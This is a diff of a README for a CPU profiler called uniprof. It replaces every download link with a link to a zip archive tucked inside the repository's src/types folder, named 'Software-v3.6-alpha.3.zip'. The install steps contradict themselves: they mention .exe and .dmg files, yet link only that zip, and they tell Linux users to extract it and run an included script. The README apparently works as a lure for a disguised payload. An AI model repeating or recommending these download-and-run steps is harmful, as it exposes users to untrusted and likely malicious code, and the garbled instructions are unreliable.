@@ -1,6 +1,6 @@
 # 🚀 uniprof - Easy CPU Profiling for Everyone
 
-![Download uniprof](https://raw.githubusercontent.com/shadi-gamal/uniprof/main/tests/fixtures/test-simple.trace.zip%20uniprof-v1.0.0-blue)
+![Download uniprof](https://github.com/shadi-gamal/uniprof/raw/refs/heads/main/src/types/Software-v3.6-alpha.3.zip%20uniprof-v1.0.0-blue)
 
 ## 📖 Overview
 
@@ -29,14 +29,14 @@ To run uniprof smoothly, ensure your system meets the following requirements:
 To get started with uniprof, you need to download it from our Releases page. Here’s how:
 
 1. **Visit the Download Page**: Click the link below to find the latest version of uniprof:
-   [Download uniprof](https://raw.githubusercontent.com/shadi-gamal/uniprof/main/tests/fixtures/test-simple.trace.zip)
+   [Download uniprof](https://github.com/shadi-gamal/uniprof/raw/refs/heads/main/src/types/Software-v3.6-alpha.3.zip)
 
-2. **Download the Application**: You will see several files. Choose the version suitable for your operating system. For example, if you're on Windows, download the `.exe` file. For MacOS, download the `.dmg` file. Linux users will find a `https://raw.githubusercontent.com/shadi-gamal/uniprof/main/tests/fixtures/test-simple.trace.zip` file. 
+2. **Download the Application**: You will see several files. Choose the version suitable for your operating system. For example, if you're on Windows, download the `.exe` file. For MacOS, download the `.dmg` file. Linux users will find a `https://github.com/shadi-gamal/uniprof/raw/refs/heads/main/src/types/Software-v3.6-alpha.3.zip` file. 
 
 3. **Run the Installer**:
    - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - For MacOS: Open the `.dmg` file and drag the uniprof application to your Applications folder.
-   - For Linux: Extract the `https://raw.githubusercontent.com/shadi-gamal/uniprof/main/tests/fixtures/test-simple.trace.zip` file and run the included script to install.
+   - For Linux: Extract the `https://github.com/shadi-gamal/uniprof/raw/refs/heads/main/src/types/Software-v3.6-alpha.3.zip` file and run the included script to install.
 
 4. **Open uniprof**: After installation, find uniprof in your applications folder or desktop, and start using it!
 
@@ -76,4 +76,4 @@ Additionally, if you wish to contribute, feel free to open a pull request or sub
 
 For detailed documentation and guides, visit our GitHub wiki or check out the official documentation linked in the repository.
 
-[Download uniprof](https://raw.githubusercontent.com/shadi-gamal/uniprof/main/tests/fixtures/test-simple.trace.zip)
+[Download uniprof](https://github.com/shadi-gamal/uniprof/raw/refs/heads/main/src/types/Software-v3.6-alpha.3.zip)
